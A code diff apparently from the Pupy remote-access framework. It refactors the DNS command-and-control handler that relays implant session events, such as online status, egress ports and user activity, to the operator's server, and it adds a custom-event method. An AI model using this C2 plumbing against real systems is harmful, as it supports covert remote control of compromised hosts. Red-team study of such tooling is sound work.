@@ -23,7 +23,8 @@ from .PupyTriggers import (
     ON_DNSCNC_EGRESS_PORTS, ON_DNSCNC_HIGH_RESOURCE_USAGE,
     ON_DNSCNC_PSTORE, ON_DNSCNC_USER_ACTIVE,
     ON_DNSCNC_USER_INACTIVE, ON_DNSCNC_USERS_INCREMENT,
-    ON_DNSCNC_USERS_DECREMENT, ON_DNSCNC_ONLINE_STATUS
+    ON_DNSCNC_USERS_DECREMENT, ON_DNSCNC_ONLINE_STATUS,
+    CUSTOM
 )
 
 class PupyDnsCommandServerHandler(DnsCommandServerHandler):
@@ -67,51 +68,66 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
     def on_new_session(self, session):
         event(
             ON_DNSCNC_SESSION, session,
-            self.server,
+            self.server.pupsrv,
             sid=session.spi, node=session.node)
 
     def on_session_cleaned_up(self, session):
         event(ON_DNSCNC_SESSION_LOST,
-              session, self.server,
+              session, self.server.pupsrv,
               sid=session.spi, node=session.node)
 
     def on_online_status(self, session):
         event(ON_DNSCNC_ONLINE_STATUS, session,
-              self.server, sid=session.spi, node=session.node,
+              self.server.pupsrv, sid=session.spi, node=session.node,
               **session.online_status)
 
     def on_egress_ports(self, session):
         event(ON_DNSCNC_EGRESS_PORTS, session,
-              self.server, sid=session.spi, node=session.node,
+              self.server.pupsrv, sid=session.spi, node=session.node,
               ports=session.egress_ports)
 
     def on_pstore(self, session):
         event(ON_DNSCNC_PSTORE, session,
-              self.server, sid=session.spi, node=session.node)
+              self.server.pupsrv, sid=session.spi, node=session.node)
 
     def on_user_become_active(self, session):
         event(ON_DNSCNC_USER_ACTIVE, session,
-              self.server, sid=session.spi, node=session.node)
+              self.server.pupsrv, sid=session.spi, node=session.node)
 
     def on_user_become_inactive(self, session):
         event(ON_DNSCNC_USER_INACTIVE, session,
-              self.server, sid=session.spi, node=session.node)
+              self.server.pupsrv, sid=session.spi, node=session.node)
 
     def on_users_increment(self, session):
         event(ON_DNSCNC_USERS_INCREMENT, session,
-              self.server, sid=session.spi, node=session.node,
+              self.server.pupsrv, sid=session.spi, node=session.node,
               count=session.system_status['users'])
 
     def on_users_decrement(self, session):
         event(ON_DNSCNC_USERS_DECREMENT, session,
-              self.server, sid=session.spi, node=session.node,
+              self.server.pupsrv, sid=session.spi, node=session.node,
               count=session.system_status['users'])
 
     def on_high_resource_usage(self, session):
         event(ON_DNSCNC_HIGH_RESOURCE_USAGE, session,
-              self.server, sid=session.spi, node=session.node,
+              self.server.pupsrv, sid=session.spi, node=session.node,
               mem=session.system_status['mem'],
               cpu=session.system_status['cpu'])
+
+    def on_custom_event(self, eventid, session, node):
+        if eventid & CUSTOM != CUSTOM:
+            logger.error('Malformed eventid: %08x', eventid)
+            return
+
+        if session:
+            event(eventid, session,
+                self.server.pupsrv, sid=session.spi, node=session.node)
+        elif node:
+            event(eventid, None,
+                self.server.pupsrv, sid=None, node=node)
+        else:
+            event(eventid, None,
+                self.server.pupsrv, sid=None, node=None)
 
     def onlinestatus(self, node=None, default=False):
         return self.add_command(
@@ -270,6 +286,7 @@ class PupyDnsCnc(object):
         self.listeners = listeners
         self.handler = cmdhandler
         self.pproxy = pproxy
+        self.pupsrv = server
 
         fdqn = self.config.get('pupyd', 'dnscnc').split(':')
         domain = fdqn[0]
